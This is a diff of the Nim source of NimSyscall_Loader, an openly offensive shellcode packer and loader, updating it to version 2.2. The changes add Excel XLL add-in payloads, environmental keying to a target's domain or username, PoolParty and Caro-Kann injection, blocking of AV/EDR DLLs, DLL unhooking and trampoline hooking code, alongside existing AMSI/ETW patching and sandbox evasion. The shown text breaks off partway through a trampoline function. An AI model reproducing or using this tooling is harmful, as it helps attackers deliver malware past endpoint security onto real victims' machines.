@@ -31,6 +31,7 @@ import CurrentProcInject
 import RemoteProcInject
 import DInvoke
 import Powershell
+import CSharp
 import AntiDebug
 
 
@@ -55,7 +56,7 @@ let banner = """
  / /|  / / / / / / /__/ / /_/ (__  ) /__/ /_/ / / /    / /___/ /_/ / /_/ / /_/ /  __/ /    
 /_/ |_/_/_/ /_/ /_/____/\__, /____/\___/\__,_/_/_/____/_____/\____/\__,_/\__,_/\___/_/     
                        /____/                   /_____/      --> @ShitSecure
-                                                                 v2.1                                            
+                                                                 v2.2                                            
 
 """
 
@@ -64,10 +65,10 @@ echo banner
 #Handle arguments
 
 let helpmenu = """
-NimSyscall_Loader v 2.1
+NimSyscall_Loader v 2.2
 
 Usage:
-  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --keyfile=<keyFile> --dnsKey --dnsdomain=<sub.example.com> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --noNimMain --clone=<dllToClone> --dllProxy --cpl --service --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --noOneShot --PatchAMSI --PatchETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --RWX --CallbackExecute --localCreateThread --QueueApc --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --mapSection --unhook --reflective --obfuscate --macPayload --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --noAntidebug --noDefaultSandBox --noAntiEmulate --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --sourceonly --jmpEntry --jmpEntryDLL=<example.dll> --jmpEntryFunc=<exampleFunc> --dripallocate --dripsleep=<sleeptime-ms> --stegofile=<filepath> --ruy-lopez --threadless --threadlessDll=<dllname.dll> --threadlessFunc=<dllfunc> --Caro-Kann --stomb --stombDll=<dllname.dll> --stombFunc=<dllfunc> --stombFunc2=<dllfunc2> --restore]
+  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --keyfile=<keyFile> --dnsKey --dnsdomain=<sub.example.com> --environmentalKey=<domain,username> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --noNimMain --clone=<dllToClone> --dllProxy --cpl --xll --service --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --noOneShot --PatchAMSI --PatchETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --RWX --CallbackExecute --localCreateThread --QueueApc --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --mapSection --unhook=<dllname1,dllname2> --reflective --obfuscate --macPayload --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2> --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --noAntidebug --noDefaultSandBox --noAntiEmulate --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --csout --scout --sourceonly --jmpEntry --jmpEntryDLL=<example.dll> --jmpEntryFunc=<exampleFunc> --dripallocate --dripsleep=<sleeptime-ms> --stegofile=<filepath> --ruy-lopez --threadless --threadlessDll=<dllname.dll> --threadlessFunc=<dllfunc> --poolparty=<number> --Caro-Kann --Caro-Kann-Thread --stomb --stombDll=<dllname.dll> --stombFunc=<dllfunc> --stombFunc2=<dllfunc2> --restore]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -82,6 +83,9 @@ Options:
     --keyfile keyfile  File to read key from
     --dnsKey    Use remote DNS TXT Record as key which is retrieved on runtime
       --dnsdomain sub.example.com    Specify a subdomain to use for the DNS TXT Record
+  --environmentalKey value    Use environmental key (domain,username) to encrypt with
+                              domain -> enumerate the current domain on runtime and use that as key
+                              username -> enumerate the current username on runtime and use that as key
   --output filename    Filename for encrypted exe/dll
   --arguments hardcodedArgs  compile the following arguments to the encrypted exe/dll
   --metadata    Set custom resource file information (cmd icon, CMD description, ntdll metadata for dlls by default)
@@ -100,6 +104,8 @@ Options:
   --psout    Powershell Output format, reflectively loading the packed binary
     --psobfs    Pre-obfuscated Powershell Template with Invoke-obfuscation.
     --pslyrics    Add Lyrics as comments to avoid some more detections
+  --csout    C# Output format, reflectively loading the packed binary
+  --scout    Shellcode Output format, reflectively loading the packed binary via donut
   --sourceonly    Dont compile but just create the source code and compile command
   --RWX    Use RWX memory permissions for Shellcode and PE-Loading (instead of default RX)
   --service    Create a Service binary or DLL, which can be used for Lateral Movement or Persistence
@@ -120,13 +126,14 @@ Options:
       --clone value    Specify a local DLL to clone the API-Exports from via Koppeling
       --dllProxy    Generate a DLL-Proxying DLL - you need to put the legit DLL into the build directory. Two output DLLs will be generated: The proxy DLL and the randomly renamed legit DLL. (Credit to @byt3bl33d3r - https://github.com/byt3bl33d3r/NimDllSideload)
       --cpl    Generate a CPL file (Control Panel Applet) instead of an executable
+      --xll    Generate an XLL file (Excel Add-In) instead of an executable
 
 [evasion]
 
   --sleep 10    Sleep 10 seconds before decryption to evade memory scanners
   --sleep-in-between 10    Sleep 10 seconds at some potentially critical steps in between to evade memory scanners
   --COMVARETW    Block ETW by setting COMPlus_ETWEnabled to 0
-  --unhook    Unhook ntdll.dll before doing anything else for the current process
+  --unhook value    Unhook the specified DLL before doing anything else for the current process
   --obfuscate    Compile the Nim binary via Denim to make use of LLVM obfuscation
   --macPayload    Convert the encrypted Shellcode to MAC-Adresses to reduce entropy (for embedded Payloads only)
   --sgn    Encode shellcode via SGN before encrypting it
@@ -161,6 +168,7 @@ Options:
   --jmpEntry    This option will enable a custom Shellcode Entrypoint from a DLL backed function to avoid unbacked memory as Thread/APC start address. The target function will be hooked with a JMP to the Shellcode
     --jmpEntryDLL value    Specify a DLL to use for the custom Shellcode Entrypoint
     --jmpEntryFunc value    Specify a function to use for the custom Shellcode Entrypoint
+  --ruy-lopez    Use Ruy-Lopez to prevent AV/EDR DLLs from being loaded into the local or newly spawned process. (Doesnt work for injection into existing processes)
 
 [Syscall retrival technique to use, default is GetSyscallStub to retrievethe stubs from disk]
 
@@ -180,7 +188,6 @@ Options:
   --mapSection    Map the shellcode into via NtCreateSection/NtMapViewOfSection . For remote injection decryption will happen AFTER writing the Shellcode into the remote process
   --remoteinject    Inject shellcode a newly spawned process (default notepad) / otherwise it's self injection
       --customprocess procname    Spawn a custom process (instead of notepad) for remote injection
-          --ruy-lopez    Use Ruy-Lopez to prevent AV/EDR DLLs from being loadied into the newly spawned process.
       --remoteprocess procname    Injects into the specified (existing) remote process name, e.g. teams.exe. The loader searches for the first process with that name
                          Can be used for multiple process names, e.g. --remoteprocess=teams.exe,iexplore.exe,MicrosoftEdge.exe -> First try teams, else Internet Explorer, last Edge
       --spoofArgs ArgstoSpoof    Spoof the arguments of the process to inject into
@@ -191,7 +198,9 @@ Options:
   --threadless    Use Threadless inject for shellcode execution (https://github.com/CCob/ThreadlessInject)
       --threadlessDll dllname    Specify a DLL to use for the Threadless inject hook
       --threadlessFunc dllfunc    Specify a function to use for the Threadless inject hook
+  --poolparty number    Use Poolparty technique 1,2,3,4 for execution
   --Caro-Kann    Use Caro-Kann technique to bypass initial memory scan detections by injecting a second shellcode which sleeps and decrypts (https://github.com/S3cur3Th1sSh1t/Caro-Kann)  
+  --Caro-Kann-Thread   Same as Caro-Kann, but the Shellcode will not do a direct JMP but instead create a Thread on the start address 
   --stomb    Enable Module Stomping to not do memory allocations. By default, 'chakra.dll' is loaded and stomped.
       --stombDll dllname    Specify a DLL to use for the Module Stomping (default is 'chakra.dll')
       --stombFunc dllfunc    Specify a function to use for the Module Stomping
@@ -221,6 +230,10 @@ proc rndStr: string =
     for _ in 0.. 10:
       add(result, char(rand(int('a') .. int('z'))))
 
+proc rndSpecial(no: int): string =
+    for _ in 0.. no:
+      add(result, char(rand(int('!') .. int('/'))))
+
 var 
     filename: string = ""
     packerPath = os.getAppDir()
@@ -232,15 +245,20 @@ var
     dll_out: bool = false
     dllfunc: string = ""
     dllexportfunctions: seq[string]
+    dllNames: seq[string]
+    unDlls: string = ""
     dllhijack: bool = false
     dllclone: bool = false
     dllToClone: string = ""
     dllProxy: bool = false
     noNimMain: bool = false
     psout: bool = false
+    csout: bool = false
+    scout: bool = false
     uselyrics: bool = false
     psobfs: bool = false
     cpl: bool = false
+    xll: bool = false
     replaceNimMain: bool = false
     big: bool
     sourceonly: bool = false
@@ -253,11 +271,16 @@ var
     customspawnprocess: string = "RuntimeBroker.exe"
     parentProcess: string = ""
     spoofArgs: string = ""
+    randomArgs: int = rand(1 .. 100)
     shellcodeFile: seq[string] = @["enc.blob"]
     keyFile: seq[string] = @["key.txt"]
     kfile: string = ""
     dnsdomain: string = ""
     customKey: bool = false
+    environmentalKey: bool = false
+    environmentalDomain: bool = false
+    environmentalUsername: bool = false
+    environmentalcheckfmt: string = ""
     stegofile: string = ""
     useStego: bool = false
     stFile: string = ""
@@ -340,24 +363,44 @@ var
     threadlessFunc: string = "NtWaitForMultipleObjects" # called regularly by RuntimeBroker.exe which is default spawn inject target.
     suspended: bool = true
     carokann: bool = false
+    carokannthread: bool = false
     stomb: bool = false
     stombDll: string = "chakra.dll"
-    stombFunc: string = "JsCreateThreadService"
-    stombFunc2: string = "MemProtectHeapUnprotectCurrentThread"
+    stombFunc: string = "JsRunScript" # this combi works for client and server
+    stombFunc2: string = "MemProtectHeapUnprotectCurrentThread" # this combi works for client and server
     restore: bool = false
     noAntiEmulate: bool = false
+    poolparty: int = 1
+    usepoolparty: bool = false
 
-let args = docopt(helpmenu, version = "NimSyscall_Loader 2.1")
+let args = docopt(helpmenu, version = "NimSyscall_Loader 2.2")
 
 if args["--file"]:
   let fname = args["--file"]
   filename = fmt"{fname}"
   echo filename
 
+if args["--environmentalKey"]:
+  if(customKey == false):
+    echo "You need to specify the environmental value (domain or username or both) via the --key parameter, otherwise the payload cannot get encrypted via that!"
+    quit(0)
+  environmentalKey = true
+  let environmentalArgs = args["--environmentalKey"]
+  environmentalcheckfmt = fmt"{environmentalArgs}"
+  sandboxchecks = environmentalcheckfmt.split(',')
+  for m in sandboxchecks:
+    if(m.contains("domain")):
+      environmentalDomain = true
+    if(m.contains("username")):
+      environmentalUsername = true
+
 if args["--key"]:
   let keyname = args["--key"]
   envkey = fmt"{keyname}"
   customKey = true
+  # if environmentalDomain or environmentalUsername is true, make the key lowercase
+  if(environmentalKey):
+    envkey = envkey.toLower()
 
 if args["--stegofile"]:
     useStego = true
@@ -381,6 +424,16 @@ if args["--noAntiEmulate"]:
 if args["--psout"]:
     psout = true
     reflective = true
+
+if args["--csout"]:
+    csout = true
+    reflective = true
+
+if args["--scout"]:
+    scout = true
+    reflective = true
+    # disable antidebug, as this leads to problems in shellcode
+    antidebug = false
 
 if args["--psobfs"]:
     psobfs = true
@@ -522,6 +575,14 @@ if args["--cpl"]:
   dll_out = true
   cpl = true
 
+if args["--xll"]:
+  dllhijack = false
+  dll_out = true
+  xll = true
+  if args["--remoteinject"]:
+    wait = false
+  # set dllexportfunctions to xlAutoOpen, as this is the default function for Excel Add-Ins
+  dllexportfunctions = @["xlAutoOpen"]
 
 if args["--interactivePS"]:
     csharp = true
@@ -536,6 +597,8 @@ when system.hostOS == "windows":
         outfile.add(fmt"\\{customLoaderName}.dll")
     elif(cpl):
         outfile.add(fmt"\\{customLoaderName}.cpl")
+    elif(xll):
+        outfile.add(fmt"\\{customLoaderName}.xll")
     else:
         outfile.add(fmt"\\{customLoaderName}.exe")
 else:
@@ -543,6 +606,8 @@ else:
         outfile.add(fmt"/{customLoaderName}.dll")
     elif(cpl):
         outfile.add(fmt"/{customLoaderName}.cpl")
+    elif(xll):
+        outfile.add(fmt"/{customLoaderName}.xll")
     else:
         outfile.add(fmt"/{customLoaderName}.exe")
 
@@ -584,6 +649,9 @@ if args["--COMVARETW"]:
 
 if args["--unhook"]:
   unhook = true
+  let unhookdlls = args["--unhook"]
+  unDlls = fmt"{unhookdlls}"
+  dllNames = unDlls.split(',')
 
 if args["--sleep"]:
   sleeptime = parse_int($args["--sleep"])
@@ -742,8 +810,19 @@ if args["--threadlessFunc"]:
     let threadlessFuncarg = args["--threadlessFunc"]
     threadlessFunc = fmt"{threadlessFuncarg}"
 
+# parse number as int
+if args["--poolparty"]:
+    usepoolparty = true
+    let poolpartyarg = args["--poolparty"]
+    poolparty = parse_int($poolpartyarg)
+    suspended = false
+
 if args["--Caro-Kann"]:
     carokann = true
+
+if args["--Caro-Kann-Thread"]:
+    carokann = true
+    carokannthread = true
 
 if args["--stomb"]:
     stomb = true
@@ -806,7 +885,7 @@ if (hellsgate and jump):
     echo "Error: Cannot use both --hellsgate and --jump! --jump can only be used with --syswhispers"
     quit(1)
 
-if ((csharp and shellcode) or (csharp and peload) or (csharp and peinject) or (peload and shellcode)):
+if ((csharp and shellcode) or (csharp and peload) or (peload and shellcode)):
     echo "Error: You can only use one of --csharp, --shellcode, --peload, or --peinject!"
     quit(1)
 
@@ -819,6 +898,23 @@ if((existingprocessInjection == false) and (remoteinject) and jmpEntry):
         echo "Error: You can only use ntdll.dll functions for SpawnInject, because the Process is suspended and only ntdll.dll is loaded. Other DLLs can only be used when using --remoteprocess for Processes, that already have the target DLL loaded!"
         quit(1)
 
+# poolparty can only be used with remoteinject
+if (usepoolparty and remoteinject == false):
+    echo "Error: You can only use --poolparty with --remoteinject!"
+    quit(1)
+
+# poolparty 1 fails in combination with Caro-Kann
+if (usepoolparty and carokann and poolparty == 1):
+    echo "Error: You cannot use --poolparty 1 with --Caro-Kann!"
+    quit(1)
+
+# cannot use poolparty in combination with threadlessinject
+if (usepoolparty and threadless):
+    echo "Error: You cannot use --poolparty with --threadless!"
+    quit(1)
+
+
+
 if (psout and dll_out):
     # Reflective DLL PE-Loading only works, when DLLMain is exposed, otherwise it won't work
     dllhijack = true
@@ -827,9 +923,9 @@ if(service):
     # For some reason, started services have the being debugged flag set or this check breaks the service, so we disable it
     antidebug = false
 
-if ((remoteinject == false) and ruylopez):
-    echo "Error: Ruy-Lopez can currently only be used in combination with --remoteinject"
-    quit(1)
+#if ((remoteinject == false) and ruylopez):
+#    echo "Error: Ruy-Lopez can currently only be used in combination with --remoteinject"
+#    quit(1)
 
 # JmpEntry and Threadless cannot be used in combination, as JmpEntry creates a thread and Threadless has the goal of avoiding thread creation
 if (jmpEntry and threadless):
@@ -869,7 +965,8 @@ if (peload and shellcode):
     quit(1)
 
 # DripAllocate, CallbackExecute, localCreateThread, QueueApc, MapSection, Caro-Kann are shellcode specific. They cannot be used in combination with csharp, interactivePS or peload
-if((csharp or interactivePS) and (dripallocate or callbackexecute or localCreateThread or useQueueAPC or remoteMapSection or carokann or ruylopez)):
+# but when csharp and peinject is set, this is possible.
+if(((csharp or interactivePS) and not peinject) and (dripallocate or callbackexecute or localCreateThread or useQueueAPC or remoteMapSection or carokann)):
     echo "Error: Cannot use --csharp/--interactivePS with --dripallocate/--CallbackExecute/--localCreateThread/--QueueApc/--mapSection/--Caro-Kann!"
     echo "This is Shellcode specific options."
     quit(1)
@@ -882,19 +979,24 @@ if (syswhispers and (threadless or carokann)):
     echo "Error: Cannot use --syswhispers with --threadless/--Caro-Kann (yet)!"
     quit(1)
 
+var
+    firstwithoutlast4: string = ""
+    lastFour: string = ""
+    lastTwo: string = ""
+    fourthtosecondlast: string = ""
 
-
-#echo "Key: " & envkey
-# Lets save the last 4 characters of the string in a new variable
-var lastTwo = envkey[^2..^1]
-var fourthtosecondlast = envkey[^4..^3]
-var lastFour = envkey[^4..^1]
-#echo "Last Four: " & lastFour
-#echo "lastTwo: " & lastTwo
-#echo "fourthtosecondlast: " & fourthtosecondlast
-# And save a key without those last 4 characters in a new one
-var firstwithoutlast4 = envkey.replace(lastFour, "")
-#echo "First without last 4 :" & firstwithoutlast4
+if(not environmentalKey or customKey):
+    #echo "Key: " & envkey
+    # Lets save the last 4 characters of the string in a new variable
+    lastTwo = envkey[^2..^1]
+    fourthtosecondlast = envkey[^4..^3]
+    lastFour = envkey[^4..^1]
+    #echo "Last Four: " & lastFour
+    #echo "lastTwo: " & lastTwo
+    #echo "fourthtosecondlast: " & fourthtosecondlast
+    # And save a key without those last 4 characters in a new one
+    firstwithoutlast4 = envkey.replace(lastFour, "")
+    #echo "First without last 4 :" & firstwithoutlast4
 
 
 # if SkipDefaultSandBoxChecks is set, put firstwithoutlast4 into the keyFile and write it to disk. Otherwise write envkey into it
@@ -1085,7 +1187,15 @@ if(carokann):
     # The egg is 4 bytes long, so we need to generate a random 4 byte key
     
     # when Caro-Kann, Stomb and ThreadlessInject are used, decryptprotectfull.bin should be used. Otherwise decryptprotect.bin
-    const hookShellcode = slurp"decryptprotect.bin"
+    
+  
+    var hookShellcode: string
+    when defined(carokannthread):
+        const slurpValue = slurp"decryptprotectthread.bin"
+        hookShellcode = slurpValue
+    else:
+        const slurpValue = slurp"decryptprotect.bin"
+        hookShellcode = slurpValue
     
     
     var hookShellcodeBytes: seq[byte] = toByteSeq(hookShellcode)
@@ -1173,6 +1283,8 @@ echo "[*] Enctext length: " & $len(enctext)
 # Convert Key to byte sequence
 #envkey = reverse(envkey)
 var expandedkey = toByteSeq(toHex(envkey))
+echo "[*] Hex key: " & cast[string](toHex(envkey))
+echo "[*] Expanded Hex key: " & repr(expandedkey)
 #expandedkey = toOpenArray(expandedkey).reverse()
 
 
@@ -1193,10 +1305,20 @@ ectx.init(key)
 ectx.encrypt(plaintext, enctext)
 ectx.clear()
 
-echo "Writing encrypted blob to disk: "
 
 var content: string = cast[string](enctext)
-writeFile(shellcodeFile[0], content)
+# if shellcodeFile[0] contains a PATH with \, we remove the path including the last \ so that the encrypted payload will land in the CWD
+var outStringShellcode: string = ""
+if (shellcodeFile[0].contains("\\")):
+    # replace everything before the last \ with nothing
+    # Get the filename from the path
+    let (_, filename) = splitPath(shellcodeFile[0])
+    outStringShellcode = filename
+else:
+    outStringShellcode = shellcodeFile[0]
+
+echo "Writing encrypted blob to disk: " & outStringShellcode
+writeFile(outStringShellcode, content)
 
 
 ### stego stuff, credit to @OffenseTeacher, https://github.com/OffenseTeacher/Steganim
@@ -1307,7 +1429,7 @@ if(useStego):
         echo "[*] Image Name: " & imageName
 
     var 
-        inputPayload = shellcodeFile[0]
+        inputPayload = outStringShellcode
         inputBaseImage = stegofile
         outputSteganoFile = stegofile
     echo "[*] Creating Stegano Image:"
@@ -1322,11 +1444,11 @@ if(useStego):
 
 if(macPayload):
     echo "[*] Converting Shellcode to MAC-Adresses: "
-    echo fmt"{packerPath}\bin2mac\bin2mac.exe {packerPath}\{shellcodeFile[0]}"
+    echo fmt"{packerPath}\bin2mac\bin2mac.exe {packerPath}\{outStringShellcode}"
     when system.hostOS == "linux":
-        macPayloadString = exec_cmd_ex(fmt"{packerPath}/bin2mac/bin2mac.py {packerPath}/{shellcodeFile[0]}")[0]
+        macPayloadString = exec_cmd_ex(fmt"{packerPath}/bin2mac/bin2mac.py {packerPath}/{outStringShellcode}")[0]
     when system.hostOS == "windows":
-        macPayloadString = exec_cmd_ex(fmt"{packerPath}\bin2mac\bin2mac.exe {packerPath}\{shellcodeFile[0]}")[0]
+        macPayloadString = exec_cmd_ex(fmt"{packerPath}\bin2mac\bin2mac.exe {packerPath}\{outStringShellcode}")[0]
     #echo macPayloadString
 
 
@@ -1472,7 +1594,14 @@ let LoadAssemblyStub = fmt"""
     when defined(lib_only):
         # https://stackoverflow.com/questions/12161813/running-a-dll-using-rundll32-exe-no-output-or-error-seen
         # https://stackoverflow.com/questions/432832/what-is-the-different-between-api-functions-allocconsole-and-attachconsole-1 to get DLL Console output
-        AttachConsole(-1)
+        when defined(ruylopez):
+            if(amISpawned()):
+                when defined(lib_only):
+                    AttachConsole(DWORD(paramStr(2).parseInt()))
+                else:
+                    AttachConsole(-1)
+        else:
+            AttachConsole(-1)
 
     when defined(Fluctuate):
         g_fluctuationData.shellcodeAddr = dectext[0].addr
@@ -1495,6 +1624,7 @@ let LoadAssemblyStub = fmt"""
     var cmd: seq[string]
     var i = 1
     discard calcHard()
+
     when defined(args):
         cmd.add({arguments.split(" ")})
     while i <= paramCount():
@@ -1506,6 +1636,15 @@ let LoadAssemblyStub = fmt"""
         else:
             cmd.add(paramStr(i))
         inc(i)
+    when defined(ruylopez):
+        when defined(localinject):
+            if(amISpawned()):
+                # for lib_only remove the 2nd argument from cmd, as this is the random integer fake param
+                when defined(lib_only):
+                    cmd = cmd[1 .. cmd.len - 1]
+                else:
+                    # remove the 1st parameter
+                    cmd = cmd[1 .. cmd.len - 1]
 """
 
 let LoadAssemblyStubArgs = """
@@ -1518,7 +1657,8 @@ when defined(defaultMain):
     when not defined(service):
         when defined(notcloned):
             when not defined(proxy):
-                discard main(nil)
+                when not defined(xll):
+                    discard main(nil)
 """
 
 let LoadAssemblyStubNoArgs = """
@@ -1530,12 +1670,14 @@ let LoadAssemblyStubNoArgs = """
 when not defined(proxy):
     when not defined(service):
         when not defined(cloned):
-            discard main(nil)
+            when not defined(xll):
+                discard main(nil)
 
 when defined(defaultMain):
     when not defined(service):
         when defined(notcloned):
-            discard main(nil)
+            when not defined(xll):
+                discard main(nil)
 """
 
 
@@ -1900,8 +2042,26 @@ import strutils
 import ptr_math
 when defined(ruylopez):
     import dynlib
-    import Hook
-    import RuyGetSyscallStub
+    type
+        typeNtCreateSection* = proc (SectionHandle: PHANDLE, DesiredAccess: ULONG, ObjectAttributes: POBJECT_ATTRIBUTES,
+                        MaximumSize: PLARGE_INTEGER, PageAttributess: ULONG, SectionAttributes: ULONG,
+                        FileHandle: HANDLE): NTSTATUS {.stdcall.}
+
+    type
+        MyNtFlushInstructionCache* = proc (ProcessHandle: HANDLE, BaseAddress: PVOID, NumberofBytestoFlush: ULONG): NTSTATUS {.stdcall.}
+
+
+    type
+        HookedNtCreate* {.bycopy.} = object
+            origNtCreate*: typeNtCreateSection
+            ntCreateStub*: array[24, BYTE]
+
+        HookTrampolineBuffers* {.bycopy.} = object
+            originalBytes*: HANDLE    ##  (Input) Buffer containing bytes that should be restored while unhooking.
+            originalBytesSize*: DWORD  ##  (Output) Buffer that will receive bytes present prior to trampoline installation/restoring.
+            previousBytes*: HANDLE
+            previousBytesSize*: DWORD
+
 # something seams to be still missing here
 #from winim/lean import ULONG, PVOID, SIZE_T, PSIZE_T, DWORD_PTR,LPDWORD,WINBOOL,TRUE,FALSE,HMODULE,LPOVERLAPPED, PIMAGE_SECTION_HEADER, LPCSTR, LPVOID, HANDLE, DWORD, GENERIC_READ, FILE_SHARE_READ, LPSECURITY_ATTRIBUTES, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, PIMAGE_DOS_HEADER, PIMAGE_NT_HEADERS, IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_FIRST_SECTION, IMAGE_SIZEOF_SECTION_HEADER, PIMAGE_EXPORT_DIRECTORY, PDWORD, BOOL, PULONG, NTSTATUS, PROCESS_ALL_ACCESS, FALSE, MEM_COMMIT, PAGE_EXECUTE_READ_WRITE, PAGE_READWRITE, CLIENT_ID, OBJECT_ATTRIBUTES
 #from winim/lean import FARPROC,NtClose,VirtualAllocEx,NT_SUCCESS
@@ -1922,6 +2082,10 @@ when defined(HardwareETW):
 when defined(csharp):
     from winim/clr import toCLRVariant,invoke,load,`.`,VT_BSTR,clrVariantToString,new,clrStart
     from os import paramCount,paramStr
+
+when defined(localinject):
+    when defined(ruylopez):
+        from os import paramCount,paramStr
 
 when defined(sleep):
     import random
@@ -1955,6 +2119,13 @@ when defined(Hellsgate):
     from os import paramStr
     {.passC:"-masm=intel".}
     from winlean import getCurrentProcess
+
+when defined(localinject):
+    when defined(ruylopez):
+        from os import getAppFilename,getCurrentDir
+        from winim import PROCESSENTRY32A,CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS,PROCESSENTRY32,Process32FirstA,Process32NextA,MODULEENTRY32A,TH32CS_SNAPMODULE,Module32FirstA,Module32NextA
+        from winim import PROCESSENTRY32,PROCESSENTRY32A,Process32NextA,Process32FirstA,CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS
+        import dynlib
 
 when defined(remoteinject):
     from winim import PROCESSENTRY32A,CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS,PROCESSENTRY32,Process32FirstA,Process32NextA,MODULEENTRY32A,TH32CS_SNAPMODULE,Module32FirstA,Module32NextA
@@ -2233,8 +2404,10 @@ when defined(stomb):
     cfgspawn = true
     when defined(carokann):
         var stombFunc2 = obf("{stombFunc2}")
-    
 
+when defined(unhook):
+    var dllNames: seq[string] = {dllNames}
+    
 when defined(carokann):
     var originalscLength: DWORD = {originalScLength}
 
@@ -2302,16 +2475,25 @@ when defined(noKey):
     when defined(webKey):
         # Todo: Implement Web Key
         echo ""
+    when defined(environmentalKey):
+        var envkey: string = ""
+        var envkey2: string = ""
 else:
     when defined(SkipDefaultSandBoxChecks):
         when defined(AntiDebug):
-            var envkey = obf("{firstwithoutlast4}")
+            when defined(customKey):
+                var envkey = obf("{envkey}")
+            else:
+                var envkey = obf("{firstwithoutlast4}")
             var envkey2 = envkey
         else:
             var envkey = obf("{envkey}")
             var envkey2 = obf("{envkey}")
     else:
-        var envkey = obf("{firstwithoutlast4}")
+        when defined(customKey):
+                var envkey = obf("{envkey}")
+        else:
+            var envkey = obf("{firstwithoutlast4}")
         var envkey2 = envkey
 var ptrEncText: ptr byte
 var ptrDecText: ptr byte
@@ -2366,6 +2548,10 @@ let Cryptstub3 = fmt"""
     proc decryptLate(): void =
         #envkey2 = reverse(envkey2)
         var expandedkey = toByteSeq(toHex(envkey2))
+        when defined(verbose):
+            echo obf("[*] Hex key: ") & cast[string](toHex(envkey))
+            echo obf("[*] Expanded Hex key: ") & repr(expandedkey)
+        
         #expandedkey = toOpenArray(expandedkey).reverse()
         discard calcHard()
         if ((int(len(expandedkey)) mod int(aes256.sizeBlock * 2)) != 0):
@@ -2728,10 +2914,7 @@ var {rand2} = {rand1}
 
 let DLLNoHideStub = """
 
-    when defined(lib_only):
-        # https://stackoverflow.com/questions/12161813/running-a-dll-using-rundll32-exe-no-output-or-error-seen
-        # https://stackoverflow.com/questions/432832/what-is-the-different-between-api-functions-allocconsole-and-attachconsole-1 to get DLL Console output
-        AttachConsole(-1)
+   
 
 """
 
@@ -2793,6 +2976,17 @@ proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL 
 let DllCustomExportStub = """
 proc `FUNC_EXPORT`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
     NimMain()
+    when defined(xll):
+        # Create a Thread on the main function
+        var threadHandle = CreateThread(NULL, 0, main, NULL, 0, NULL)
+        # when defined remoteinject CloseHandle
+        when defined(remoteinject):
+            CloseHandle(threadHandle)
+        else:
+            # Wait for the thread to finish
+            WaitForSingleObject(threadHandle, INFINITE)
+
+    
     return true
 """
 
@@ -2836,6 +3030,151 @@ SleepyCryptLoop(10000)
 
 let NotepadProcIDStub * = fmt"""
 
+    when defined(ruylopez):
+
+        var ntdlldll = LoadLibraryA(obf("ntdll.dll"))
+        if (ntdlldll == 0):
+            echo obf("[X] Failed to load ntdll.dll")
+
+
+        var NtFlushInstructionCacheAddress = GetProcAddress(ntdlldll,obf("NtFlushInstructionCache"))
+        if isNil(NtFlushInstructionCacheAddress):
+            echo obf("[X] Failed to get the address of 'NtFlushInstructionCache'")
+
+
+        var NtFlushInstructionCache: MyNtFlushInstructionCache
+        NtFlushInstructionCache = cast[MyNtFlushInstructionCache](NtFlushInstructionCacheAddress)
+
+
+        proc fastTrampoline(targetProc: HANDLE, addressToHook: LPVOID, jumpAddress: LPVOID, buffers: ptr HookTrampolineBuffers = nil): bool
+
+        var g_hookedNtCreate: HookedNtCreate
+
+        var ntCreate_Address: HANDLE
+
+        var NtCreateSection: typeNtCreateSection
+
+        proc fastTrampoline(targetProc: HANDLE, addressToHook: LPVOID, jumpAddress: LPVOID, buffers: ptr HookTrampolineBuffers): bool =
+            var trampoline: seq[byte]
+            if defined(amd64):
+                trampoline = @[
+                    byte(0x49), byte(0xBA), byte(0x00), byte(0x00), byte(0x00), byte(0x00), byte(0x00), byte(0x00), # mov r10, addr
+                    byte(0x00),byte(0x00),byte(0x41), byte(0xFF),byte(0xE2)                                         # jmp r10
+                ]
+                var tempjumpaddr: uint64 = cast[uint64](jumpAddress)
+                copyMem(&trampoline[2] , &tempjumpaddr, 6)
+            elif defined(i386):
+                trampoline = @[
+                    byte(0xB8), byte(0x00), byte(0x00), byte(0x00), byte(0x00), # mov eax, addr
+                    byte(0x00),byte(0x00),byte(0xFF), byte(0xE0)                                      # jmp eax
+                ]
+                var tempjumpaddr: uint32 = cast[uint32](jumpAddress)
+                copyMem(&trampoline[1] , &tempjumpaddr, 3)
+            
+            var dwSize: SIZE_T = cast[SIZE_T](len(trampoline))
+            var protectionLength: SIZE_T = cast[SIZE_T](len(trampoline))
+            var dwordSize: DWORD = DWORD(len(trampoline))
+            var dwOldProtect: DWORD = 0
+            var output: bool = false
